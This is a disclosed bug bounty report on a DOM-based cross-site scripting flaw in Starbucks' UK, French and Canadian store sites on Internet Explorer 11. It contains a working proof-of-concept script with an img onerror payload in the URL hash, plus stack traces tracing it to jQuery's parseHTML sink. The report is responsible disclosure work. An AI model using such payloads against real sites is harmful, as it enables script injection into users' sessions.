# DOM-based XSS in store.starbucks.co.uk on IE 11

## Report Details
- **Report ID**: 241619
- **URL**: https://hackerone.com/reports/241619
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-06-20T09:13:03.453Z
- **Disclosed**: 2017-11-03T18:08:52.345Z

## Reporter
- **Username**: albinowax
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
We've found DOM XSS on store.starbucks.co.uk and other related domains such as store.starbucks.fr and store.starbucks.ca.  It appears to be a JQuery based DOM XSS in the parseHTML sink. In order to trigger the XSS you need to use IE11 and the PoC will visit the url first, wait 5 seconds and then revisit the same url to trigger the XSS. 

Here is the PoC:
<script>
function poc() {
        var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>', 
            win = window.open(url);
        setTimeout(function(){win.location=url}, 5000);
}
</script>
<a href="#" onclick="poc();">PoC visit using IE11</a>

It may be possible to make this PoC work in Edge, too. Here is a stacktrace of where the source is accessed:

Error
    at Object.get hash [as hash] (<anonymous>:1:29568)
    at Object.initialize (eval at <anonymous> (:1:31716), <anonymous>:1:2524)
    at HTMLDivElement.eval (eval at <anonymous> (:1:31716), <anonymous>:1:6085)
    at Function.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:28:379)
    at a.fn.init.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:22:134)
    at a.fn.init.$.fn.tabs (eval at <anonymous> (:1:31716), <anonymous>:1:765)
    at HTMLDocument.<anonymous> (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:528:82)
    at r (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:69:440)
    at Object.fireWith [as resolveWith] (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:71:228)
    at Function.ready (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:24:415)
    at HTMLDocument.ga (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:19:386)
Here is a stack trace of where the sink is executed:

Error
    at HTMLDivElement.set [as innerHTML] (<anonymous>:1:41512)
    at Function.buildFragment (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:136:359)
    at Function.parseHTML (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:26:309)
    at a.fn.init (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:193:56)
    at g (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:18:396)
    at Object.initialize (eval at <anonymous> (:1:31716), <anonymous>:1:2495)
    at HTMLDivElement.eval (eval at <anonymous> (:1:31716), <anonymous>:1:6085)
    at Function.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:28:379)
    at a.fn.init.each (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:22:134)
    at a.fn.init.$.fn.tabs (eval at <anonymous> (:1:31716), <anonymous>:1:765)
    at HTMLDocument.<anonymous> (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:528:82)
    at r (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:69:440)
    at Object.fireWith [as resolveWith] (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:71:228)
    at Function.ready (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:24:415)
    at HTMLDocument.ga (https://store.starbucks.co.uk/on/demandware.static/Sites-StarbucksUK-Site/-/en_GB/v1497508834714/js/generic.min.js:19:386)


## Attachments
- Screen_Shot_2017-06-20_at_10.08.32.png
